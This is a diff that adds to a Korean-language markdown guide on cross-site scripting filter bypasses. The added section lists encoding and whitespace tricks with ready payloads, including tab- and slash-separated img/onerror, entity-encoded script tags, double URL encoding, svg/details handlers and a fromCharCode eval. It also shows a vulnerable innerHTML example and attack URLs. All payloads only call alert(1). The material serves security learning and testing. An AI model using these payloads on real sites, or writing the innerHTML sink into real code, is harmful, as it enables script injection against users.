@@ -96,6 +96,10 @@ HTML 태그에서 **이벤트 핸들러**(예: `onmouseover`, `onerror`, `onload
 
 이벤트 핸들러는 `<script>` 태그를 사용하는 것보다 **HTML 속성 내에 스크립트를 포함**시킬 수 있기 때문에 필터를 우회할 수 있습니다.
 
+```html
+https://example.com/#<img src=x onerror=alert(1)>
+```
+
 ---
 
 ### 5. **JavaScript 프로토콜 우회**
@@ -189,5 +193,136 @@ HTML5에서는 다양한 **데이터 속성**(예: `data-*` 속성)을 제공하
 ```
 
 **JavaScript**에서 이 속성의 값을 읽어 **스크립트 실행**할 수 있기 때문에 우회가 가능합니다.
+
+---
+
+### 11. **공백 우회(%20) 및 인코딩 우회 페이로드**
+
+
+## ✋ 공백 우회 정리
+
+| 원래 문자         | 우회 방법 예시                                                     |
+| ------------- | ------------------------------------------------------------ |
+| space (` `)   | `%09`, `&#x09;`, `&#x20;`, `/`, `&Tab;`, `&NewLine;`         |
+| `<script>`    | `&#x3C;script&#x3E;`, `<scr&#x69;pt>`                        |
+| `onerror=`    | `onerror&#x3D;`, `onerror%3D`, `one&#114;ror=`, 분리자 없이 붙이기 등 |
+| `javascript:` | `javas&#x63;ript:`, `java\nscript:` 등                        |
+
+
+### ✅ 1. **공백을 다른 유효한 문자로 대체**
+
+HTML 파서나 브라우저는 공백 대신 아래 문자들을 **공백처럼 처리**하기도 합니다.
+
+| 우회 문자       | 의미                     |
+| ----------- | ---------------------- |
+| `\t` (탭)    | 공백으로 인식                |
+| `\n`, `\r`  | 줄바꿈 문자 (일부 경우 분리자로 처리) |
+| `/`         | 속성명과 속성값 사이에 올 수 있음    |
+| `&#09;`     | 탭 문자 (HTML 엔티티)        |
+| `&#x20;`    | 스페이스 (16진수)            |
+| `&NewLine;` | 줄바꿈 우회 (HTML5 인식)      |
+
+#### 예: 이미지 태그 onerror 우회
+
+```html
+<img/src=x&#09;onerror=alert(1)>
+```
+
+---
+
+### ✅ 2. **HTML 엔티티 인코딩 사용**
+
+공백이나 특수 문자를 HTML 엔티티로 우회.
+
+```html
+<script>alert('XSS')</script>
+```
+
+→ 다음과 같이 우회 가능:
+
+```html
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+```
+
+또는 혼합 형태:
+
+```html
+<scr&#x69;pt>alert(1)</scr&#x69;pt>
+```
+
+---
+
+### ✅ 3. **URL 디코딩이 2번 일어나는 경우를 노림 (Double URL Encoding)**
+
+페이로드 예:
+
+```
+%253Cscript%253Ealert(1)%253C/script%253E
+```
+
+→ 서버에서 한 번 디코딩하면:
+
+```
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+→ 브라우저가 다시 디코딩하면:
+
+```
+<script>alert(1)</script>
+```
+
+---
+
+### ✅ 4. **속성 우회 / 태그 우회**
+
+```html
+<svg/onload=alert(1)>
+<iframe/src=javascript:alert(1)>
+<details/open/ontoggle=alert(1)>
+```
+
+이런 페이로드는 공백 없이도 실행 가능하며, 일부 필터를 우회할 수 있습니다.
+
+---
+
+### ✅ 5. **Javascript 우회형**
+
+```html
+<svg><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>
+```
+
+또는
+
+```html
+<a href="javas&#x63;ript:alert(1)">Click</a>
+```
+
+→ `javascript:` 프로토콜이 인코딩되어 우회 가능
+
+---
+
+## 🛠️ 실전 예시
+
+### 취약 코드 (CSR XSS 예시):
+
+```javascript
+const input = new URLSearchParams(location.search).get("q");
+document.getElementById("output").innerHTML = input;
+```
+
+---
+
+### 공격 URL (공백 우회)
+
+```
+https://example.com/page?q=<img/src=x&#09;onerror=alert(1)>
+```
+
+or
+
+```
+https://example.com/page?q=%3Cimg%2Fsrc%3Dx%09onerror%3Dalert(1)%3E
+```
 
 
